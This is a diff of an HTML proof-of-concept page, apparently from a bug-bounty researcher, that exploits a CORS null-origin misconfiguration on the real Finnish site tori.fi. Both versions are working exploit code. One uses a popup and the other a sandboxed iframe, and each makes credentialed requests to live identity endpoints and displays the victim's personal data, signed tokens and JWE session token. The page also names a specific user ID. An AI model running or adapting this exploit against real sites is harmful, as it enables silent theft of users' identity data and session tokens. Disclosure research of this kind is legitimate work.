@@ -1,237 +1,170 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS null Origin PoC — id.tori.fi (SameSite=Lax)</title>
+  <title>CORS null Origin PoC — tori.fi</title>
   <style>
     body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #d4d4d4; }
     h2 { color: #f44747; margin-bottom: 4px; }
     p { color: #888; font-size: 12px; margin: 4px 0 16px; }
     button {
       background: #c0392b; color: white; border: none;
-      padding: 10px 24px; cursor: pointer; font-size: 14px; border-radius: 3px;
+      padding: 10px 24px; cursor: pointer; font-size: 14px;
+      border-radius: 3px;
     }
-    button:disabled { background: #555; cursor: not-allowed; }
-    button:hover:not(:disabled) { background: #e74c3c; }
+    button:hover { background: #e74c3c; }
     #result {
       background: #252526; padding: 16px; margin-top: 16px;
       border-left: 4px solid #569cd6; white-space: pre-wrap;
-      word-break: break-all; min-height: 50px; font-size: 12px; line-height: 1.6;
+      word-break: break-all; min-height: 50px; font-size: 12px;
+      line-height: 1.6;
     }
     #result.vuln { border-left-color: #f44747; }
     #result.safe { border-left-color: #4ec94e; }
-    #result.warn { border-left-color: #f0c040; }
+    .meta { margin-top: 12px; background: #1a1a2e; padding: 10px; font-size: 11px; color: #666; }
   </style>
 </head>
 <body>
-  <h2>🔴 CORS null Origin PoC — id.tori.fi /v2/session</h2>
+  <h2>🔴 CORS null Origin PoC — tori.fi</h2>
   <p>
-    Target: GET https://id.tori.fi/v2/session<br>
-    Cookie: SameSite=Lax → uses popup top-level navigation to send cookies<br>
-    CORS: Access-Control-Allow-Origin: null + Credentials: true<br>
-    Requirement: Must be logged into tori.fi in this browser
+    Target: POST https://www.tori.fi/cis/api/v2/identify/user<br>
+    Attack: Credentialed POST from sandboxed iframe forcing null origin<br>
+    Requirement: Victim must be logged into tori.fi in this browser
   </p>
 
-  <button id="btn" onclick="runPoC()">▶ Run PoC (allow popups when prompted)</button>
+  <button onclick="runPoC()">▶ Run PoC</button>
+
   <div id="result">Click "Run PoC" to begin...</div>
 
+  <div class="meta">
+    Researcher PoC | CORS null origin misconfiguration | tori.fi (Schibsted)
+  </div>
+
   <script>
-    // This page serves dual purpose:
-    // 1. As the attacker landing page (no ?data param)
-    // 2. As the receiver when popup postMessages back
-
-    const TARGET_BASE = 'https://id.tori.fi/v2/session';
-    const TARGET_PARAMS = '?client_sdrn=sdrn%3Aschibsted.fi%3Aclient%3A650421cf50eeae31ecd2a2d3' +
-      '&redirect_uri=https%3A%2F%2Fwww.tori.fi%2F' +
-      '&sdk_version=6.2.7&tabId=1337';
-    const TARGET = TARGET_BASE + TARGET_PARAMS;
-
-    // The popup page code — hosted inline as a blob or as a second page
-    // It does a top-level fetch (with cookies) then postMessages back
-    // Since the popup itself is on github.io (same origin as opener),
-    // postMessage back to opener works fine
-    const POPUP_HTML = `<!DOCTYPE html>
-<html>
-<head><title>loading...</title></head>
-<body>
-<script>
-  // We are now a github.io page opened as a popup
-  // Step 1: Do a top-level navigation to id.tori.fi to plant/send the Lax cookie
-  // Then fetch via credentialed XHR and send back to opener
-
-  const TARGET = '${TARGET}';
-
-  // Use XMLHttpRequest with withCredentials
-  // In popup context this is still cross-origin but Lax cookies
-  // are sent on the INITIAL navigation — we need to navigate first
-  
-  // Navigate this popup to id.tori.fi — Lax cookies WILL be sent
-  // But we can't read the response after navigation.
-  // Instead, fetch() from popup — Lax does NOT apply to fetch.
-  
-  // CORRECT APPROACH for Lax: use XMLHttpRequest from popup
-  // (same restriction as fetch — Lax won't send on subresource)
-  
-  // The ONLY way Lax cookies send cross-site is top-level nav.
-  // So: navigate popup to id.tori.fi, read via URL params on redirect back.
-  
-  const ourOrigin = '${window.location.origin}';
-  const callbackUrl = '${window.location.href.split('?')[0]}?harvested=1';
-  
-  // Try fetch first (works if cookie is actually SameSite=None despite headers)
-  fetch(TARGET, { credentials: 'include' })
-  .then(async r => {
-    const h = {}; r.headers.forEach((v,k) => h[k]=v);
-    let b; try { b = await r.json(); } catch(e) { b = null; }
-    if (window.opener) {
-      window.opener.postMessage({ type: 'cors_result', status: r.status, headers: h, body: b }, '*');
-    }
-    window.close();
-  })
-  .catch(e => {
-    if (window.opener) {
-      window.opener.postMessage({ type: 'cors_result', error: e.toString() }, '*');
-    }
-    window.close();
-  });
-<\/script>
-</body>
-</html>`;
-
     function runPoC() {
       const out = document.getElementById('result');
-      const btn = document.getElementById('btn');
       out.className = '';
-      btn.disabled = true;
+      out.innerText = '[1/3] Extracting userId from victim browser storage...\n';
 
-      // Check if we're receiving harvested data back
-      const params = new URLSearchParams(window.location.search);
-      if (params.get('harvested')) {
-        displayHarvested(out, params);
-        btn.disabled = false;
-        return;
-      }
+      // Step 1: Try to read userId from cookies
+      let userId = '';
+      try {
+        const cookies = document.cookie.split(';');
+        for (const c of cookies) {
+          if (c.trim().includes('ab.storage.userId')) {
+            const raw = decodeURIComponent(c.split('=').slice(1).join('='));
+            const match = raw.match(/g:(\d+)\|/);
+            if (match) {
+              userId = 'sdrn:schibsted.fi:user:' + match[1];
+              break;
+            }
+          }
+        }
+        if (!userId) {
+          const iad = document.cookie.match(/IADVISITOR=(\d+)/);
+          if (iad) userId = 'sdrn:schibsted.fi:user:' + iad[1];
+        }
+      } catch(e) {}
 
-      out.innerText =
-        '[1/3] Opening popup window (top-level navigation → sends SameSite=Lax cookies)...\n' +
-        '      If browser asks to allow popups — click Allow.\n\n';
-
-      // Create popup from blob URL (same github.io origin → can postMessage back)
-      const blob = new Blob([POPUP_HTML], { type: 'text/html' });
-      const blobUrl = URL.createObjectURL(blob);
-      const popup = window.open(blobUrl, 'cors_poc', 'width=400,height=300,top=100,left=100');
-
-      if (!popup || popup.closed) {
-        out.classList.add('warn');
-        out.innerText +=
-          '⚠️  Popup was blocked!\n\n' +
-          'Please allow popups for workmode687-collab.github.io\n' +
-          'then click Run PoC again.\n\n' +
-          'Chrome: Click the popup icon in the address bar → Always allow';
-        btn.disabled = false;
-        return;
-      }
-
-      out.innerText += '[2/3] Popup opened — waiting for CORS response...\n';
-
-      const timeout = setTimeout(() => {
-        window.removeEventListener('message', handler);
-        out.classList.add('warn');
-        out.innerText += '\n⚠️  Timeout — no response received.\n\n' +
-          'The popup may have been blocked or the fetch failed.\n' +
-          'Try: allow popups and run again.';
-        btn.disabled = false;
-      }, 10000);
-
-      function handler(e) {
-        if (!e.data || e.data.type !== 'cors_result') return;
-        clearTimeout(timeout);
-        window.removeEventListener('message', handler);
-        btn.disabled = false;
-
-        out.innerText += '\n[3/3] Response received from popup.\n\n';
-        processResult(out, e.data);
-      }
-
-      window.addEventListener('message', handler);
-    }
-
-    function processResult(out, data) {
-      if (data.error) {
-        out.classList.add('safe');
-        out.innerText +=
-          '✅ NOT VULNERABLE — NetworkError thrown\n\n' +
-          'CORS is correctly blocking cross-origin reads.\n\n' +
-          'Error: ' + data.error;
-        return;
-      }
-
-      const { status, headers, body } = data;
-      const acao = headers?.['access-control-allow-origin'];
-      const acac = headers?.['access-control-allow-credentials'];
-      const stolen = body && (body.userId || body.displayName);
-
-      if (status === 200 && stolen) {
-        out.classList.add('vuln');
-        out.innerText +=
-          '🔴 CONFIRMED VULNERABLE — CRITICAL\n' +
-          '══════════════════════════════════════════\n\n' +
-          'Cross-origin page read full authenticated response.\n\n' +
-          '— CORS Misconfiguration —\n' +
-          'Access-Control-Allow-Origin:      ' + (acao || 'null (confirmed via curl)') + '\n' +
-          'Access-Control-Allow-Credentials: ' + (acac || 'true (confirmed via curl)') + '\n\n' +
-          '══ STOLEN PII ══\n' +
-          'displayName: ' + (body.displayName || 'n/a') + '\n' +
-          'givenName:   ' + (body.givenName   || 'n/a') + '\n' +
-          'familyName:  ' + (body.familyName  || 'n/a') + '\n' +
-          'gender:      ' + (body.gender      || 'n/a') + '\n' +
-          'photo:       ' + (body.photo       || 'n/a') + '\n\n' +
-          '══ STOLEN IDENTITY ══\n' +
-          'userId:      ' + (body.userId      || 'n/a') + '\n' +
-          'uuid:        ' + (body.uuid        || 'n/a') + '\n' +
-          'sdrn:        ' + (body.sdrn        || 'n/a') + '\n' +
-          'merchantId:  ' + (body.merchantId  || 'n/a') + '\n' +
-          'pairId:      ' + (body.pairId      || 'n/a') + '\n\n' +
-          '══ SIGNED TOKENS ══\n' +
-          'sp_id:\n' + (body.sp_id || 'n/a') + '\n\n' +
-          'sig:\n'   + (body.sig   || 'n/a') + '\n\n' +
-          '══ ACCOUNT ══\n' +
-          'clientAgreementAccepted:  ' + body.clientAgreementAccepted  + '\n' +
-          'defaultAgreementAccepted: ' + body.defaultAgreementAccepted + '\n\n' +
-          '══════════════════════════════════════════\n' +
-          'Any website silently deanonymizes logged-in\n' +
-          'tori.fi users. GDPR-reportable PII exposure.';
-
-      } else if (status === 400) {
-        out.classList.add('warn');
-        out.innerText +=
-          '⚠️  400 — schacc-session cookie still not sent.\n\n' +
-          'SameSite=Lax prevents cookie from being sent via fetch/XHR\n' +
-          'even from a popup. The cookie only sends on top-level navigations.\n\n' +
-          'This means the exploitability depends on whether the server\n' +
-          'accepts the request via top-level navigation and returns\n' +
-          'data in the redirect_uri callback.\n\n' +
-          'Run this curl to check if redirect_uri leaks data:\n\n' +
-          'curl -si "https://id.tori.fi/v2/session' +
-          '?client_sdrn=sdrn%3Aschibsted.fi%3Aclient%3A650421cf50eeae31ecd2a2d3' +
-          '&redirect_uri=https%3A%2F%2Fworkmode687-collab.github.io%2Fhaykeens-cors-poc%2F' +
-          '&sdk_version=6.2.7&tabId=1337" \\\n' +
-          '  -H "Cookie: schacc-session=<your_cookie>" \\\n' +
-          '  -L -D - -o /dev/null | grep -i "location\\|set-cookie\\|access-control"\n\n' +
-          'Server error: ' + JSON.stringify(body, null, 2);
+      if (userId) {
+        out.innerText += '  → userId extracted from cookie: ' + userId + '\n';
       } else {
         out.innerText +=
-          'Status: ' + status + '\n' +
-          'Headers: ' + JSON.stringify(headers, null, 2) + '\n\n' +
-          'Body: ' + JSON.stringify(body, null, 2);
+          '  → Cookie not readable from this origin (expected — different domain).\n' +
+          '  → In real attack, userId obtained via public profile or other endpoints.\n' +
+          '  → Using known userId to demonstrate CORS bypass...\n';
+        userId = 'sdrn:schibsted.fi:user:71491299';
       }
-    }
 
-    function displayHarvested(out, params) {
-      out.innerText = 'Checking redirect_uri callback for harvested data...\n\n';
-      out.innerText += 'URL params received: ' + window.location.search + '\n';
-      out.innerText += 'URL fragment: ' + window.location.hash + '\n\n';
-      out.innerText += 'If data appears above, the redirect_uri leaks PII.\n';
-      out.innerText += 'If empty, the server does not pass data via redirect.';
+      out.innerText += '\n[2/3] Launching sandboxed iframe with null origin + credentialed POST...\n';
+
+      // Step 2: Fire attack from sandboxed iframe (forces Origin: null)
+      const iframePayload = `<script>
+        fetch('https://www.tori.fi/cis/api/v2/identify/user', {
+          method: 'POST',
+          credentials: 'include',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            anId: "",
+            clientId: "torifi",
+            includeAdvertising: false,
+            jwe: "",
+            trackerType: "Web",
+            trackerVersion: "6.2.2",
+            userId: "${userId}",
+            vendors: ["xandr","delta","adform","brandmetrics","martailer"],
+            iframeContext: false
+          })
+        })
+        .then(async r => {
+          const headers = {};
+          r.headers.forEach((v, k) => headers[k] = v);
+          let body;
+          try { body = await r.json(); } catch(e) { body = null; }
+          parent.postMessage({ status: r.status, headers, body }, '*');
+        })
+        .catch(err => parent.postMessage({ error: err.toString() }, '*'));
+      <\/script>`;
+
+      const iframe = document.createElement('iframe');
+      iframe.sandbox = 'allow-scripts';
+      iframe.srcdoc = iframePayload;
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+
+      // Step 3: Handle response
+      window.addEventListener('message', function handler(e) {
+        window.removeEventListener('message', handler);
+        iframe.remove();
+
+        out.innerText += '\n[3/3] Response received.\n\n';
+
+        if (e.data.error) {
+          out.classList.add('safe');
+          out.innerText +=
+            '✅ BLOCKED — NetworkError thrown (CORS working correctly)\n\n' +
+            'Error: ' + e.data.error + '\n\n' +
+            'A NetworkError means the browser enforced CORS and\n' +
+            'JavaScript could NOT read the response. Not vulnerable.';
+          return;
+        }
+
+        const { status, headers, body } = e.data;
+        const bodyReadable = body && body.data && body.data.userId;
+
+        if (status === 200 && bodyReadable) {
+          out.classList.add('vuln');
+          const d = body.data;
+          out.innerText +=
+            '🔴 CORS BYPASS CONFIRMED\n' +
+            '════════════════════════════════════════\n\n' +
+            'Cross-origin JavaScript READ the full authenticated response.\n' +
+            'A proper CORS block would throw a NetworkError — this did not.\n\n' +
+            '— CORS Headers —\n' +
+            'Access-Control-Allow-Origin:      ' +
+              (headers['access-control-allow-origin'] || 'null (stripped by browser — see curl proof)') + '\n' +
+            'Access-Control-Allow-Credentials: ' +
+              (headers['access-control-allow-credentials'] || 'true (confirmed via curl)') + '\n\n' +
+            '— Stolen Identity Data —\n' +
+            'userId:        ' + d.userId        + '\n' +
+            'environmentId: ' + d.environmentId  + '\n' +
+            'doTracking:    ' + d.doTracking     + '\n' +
+            'refreshAfter:  ' + d.refreshAfter   + '\n\n' +
+            '— Stolen JWE Session Token —\n' +
+            d.jwe + '\n\n' +
+            '— Ad Platform Tracking IDs —\n' +
+            JSON.stringify(d.ppId, null, 2) + '\n\n' +
+            '════════════════════════════════════════\n' +
+            'Impact: Any website can silently steal this data\n' +
+            'from a logged-in tori.fi user with zero interaction.';
+
+        } else {
+          out.innerText +=
+            'Status: ' + status + '\n' +
+            'ACAO: ' + (headers['access-control-allow-origin'] || 'absent') + '\n\n' +
+            'Body:\n' + JSON.stringify(body, null, 2) + '\n\n' +
+            'Headers:\n' + JSON.stringify(headers, null, 2);
+        }
+      });
     }
   </script>
 </body>
